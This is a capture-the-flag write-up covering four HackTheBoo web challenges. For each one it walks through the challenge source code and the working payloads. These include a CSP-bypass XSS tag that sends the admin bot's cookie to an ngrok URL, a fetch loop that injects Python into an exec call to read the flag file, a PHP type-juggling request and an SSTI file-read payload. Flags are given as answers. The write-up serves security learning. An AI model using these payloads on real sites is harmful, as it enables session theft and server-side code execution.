+++
title = "HackTheBoo web challenges"
date = "2022-10-28"
author = "m0hs1ne"
description = "some challenges i solved in HackTheBox event 'HackTheBoo'"
+++

# Cursed Secret Party
> You've just received an invitation to a party. Authorities have reported that the party is cursed, and the guests are trapped in a never-ending unsolvable murder mystery party. Can you investigate further and try to save everyone?

## Solution

Looking through the provided source code, we see a `bot.js` file which reads the flag.txt file.
```javascript
const fs = require('fs');
const puppeteer = require('puppeteer');
const JWTHelper = require('./helpers/JWTHelper');
const flag = fs.readFileSync('/flag.txt', 'utf8');
```
The `visit` function opens a browser page and sets a `JWT` token as a cookie. The flag is passed in said token. So we obviously need to steal the bot's cookie to get the flag.

```javascript
const visit = async () => {
    try {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();

		let token = await JWTHelper.sign({ username: 'admin', user_role: 'admin', flag: flag });
		await page.setCookie({
			name: 'session',
			value: token,
			domain: '127.0.0.1:1337'
		});
```

After the bot sets the cookie, it visits the `/admin` endpoint, waits 5 seconds, then deletes all the content.
```javascript
		await page.goto('http://127.0.0.1:1337/admin', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});

		await page.goto('http://127.0.0.1:1337/admin/delete_all', {
			waitUntil: 'networkidle2',
			timeout: 5000
		});
```
In the index.js file we notice that we have some definitions set for the CSP.
```javascript
app.use(function (req, res, next) {
    res.setHeader(
        "Content-Security-Policy",
        "script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'"
    );
```
We noticed this earlier in our Response as well:
```
Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'
```
After a little bit of research about CSP and XSS, I found out in the CSP evaluator :
```
cdn.jsdelivr.net is known to host JSONP endpoints and Angular libraries which allow to bypass this CSP.
```
We can host an `xss.js` file on a GH repository and add something like alert(1). We can finally trigger the alert, but we need to cookie.

Digging deep enough, i found out this repository: [CSP bypass](https://github.com/CanardMandarin/csp-bypass). It's a simple project that allows the bypass of csp.

we need to create a script tag that point to that repository and  execute a "query" to our ngrok.

Finally we got it:
```javascript
<script src="https://cdn.jsdelivr.net/gh/canardmandarin/csp-bypass@master/dist/sval-classic.js"></script><br csp="window.location='[ngrok url]/?c='.concat(document.cookie)">
```
We got the cookie.
In the `JWTHelper.js` file we see how the JWT token is signed. It uses HS256 with a big random hex string .
```javascript
const APP_SECRET = crypto.randomBytes(69).toString('hex');

module.exports = {
	sign(data) {
		data = Object.assign(data);
		return (jwt.sign(data, APP_SECRET, { algorithm:'HS256' }))
	},
	async verify(token) {
		return (jwt.verify(token, APP_SECRET, { algorithm:'HS256' }));
	}
}
```

Finaly we decoded our token using `jwt.io`.

The flag :
```
HTB{cdn_c4n_byp4ss_c5p!!}
```

# Evaluation Deck

>  A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?

## Solution
We are given the source code for the website, after reading some of the code, I found an API that features an interesting method that supposedly calculates the health of the ghost (in the website) from the given parameters.

```python
@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')
    
    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result)
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```
However, they are using Python's `compile` and `exec` function, which can be very dangerous when executed from unsanitized user input.

We can control all the parameters, but `current_health` and `attack_power` are converted to int and that limits us to passing only numbers.

That leaves us with `operator` that needs to be added to two numbers. So I tried to find a way to convert the flag into a number which can then be converted back  into the flag itself.

I ended up converting the flag into `ASCII` unicode using the following function :

```python
ord(character)
```

So the final payload to be sent as a POST reqeust to api:

```javascript
let str = "";
for (let i = 0; i < 50; i++) {
  fetch("[IP]/api/get_health", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      current_health: "0",
      attack_power: "0",
      operator: `+ ord(open("../../../flag.txt").read()[${i}]);`,
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      str += data.message + " ";
    });
}
```
Then I got the result in ascii unicode, so I converted it back to characters using the following function :
```python
chr(ascii unicode)
```
The Flag:
```
HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}
```

# Juggling Facts

> An organization seems to possess knowledge of the true nature of pumpkins. Can you find out what they honestly know and uncover this centuries-long secret once and for all?

## Solution

When i press `Secret Facts` it shows : `Secrets can only be accessed by admin`

[![Screen-Shot-2022-10-28-at-2-47-04-PM.png](https://i.postimg.cc/yYp2bxkP/Screen-Shot-2022-10-28-at-2-47-04-PM.png)](https://postimg.cc/VdM7SY9r)

Since this challenge’s name is Juggling Facts, I’ll google php juggling.

Now, we can dig deeper in this exploit: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling).

[![a5.png](https://i.postimg.cc/NFXwcrLm/a5.png)](https://postimg.cc/SYmPLR6x)

It seems like `IndexController.php` is vulnerable:
```PHP
 if ($jsondata['type'] === 'secrets' && $_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
        {
            return $router->jsonify(['message' => 'Currently this type can be only accessed through localhost!']);
        }

        switch ($jsondata['type'])
        {
            case 'secrets':
                return $router->jsonify([
                    'facts' => $this->facts->get_facts('secrets')
                ]);
```

The first if statement is NOT vulnerable, as it’s using strict comparison (`===`, `!==`). So, we have to parse the type `POST` parameter.

However, the `switch` statement is vulnerable, According to official [PHP documentation](https://www.php.net/manual/en/control-structures.switch.php) switch/case does [loose comparision](php.net/manual/en/types.comparisons.php#types.comparisions-loose).
Since the case secrets is the first item, it can bypass the `REMOTE_ADDR`.

So the final payload to be sent as a POST reqeust to api:
```javascript
fetch('[IP]/api/getfacts', {method:'POST',headers:{'Content-Type':'application/json'}, body:JSON.stringify({type: true})});
```

We got the flag:
```
HTB{sw1tch_stat3m3nts_4r3_vuln3r4bl3!!!}
```

# Spookifier

> There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?

## Solution
First thing i did is try Server Side Template Injection, which allows RCE. Even if you are not sure from the source code whether it is vulnerable, you could try fuzzing in a few inputs. I tried `{{5*5}}`, `{5*5}` and `${5*5}` and found that `${5*5}` worked to display 25 on the webpage!

Perfect, now all we need to do is to read the flag with the payload `${open("/flag.txt").read()}`.

The Flag:

 ```
 HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}
 ```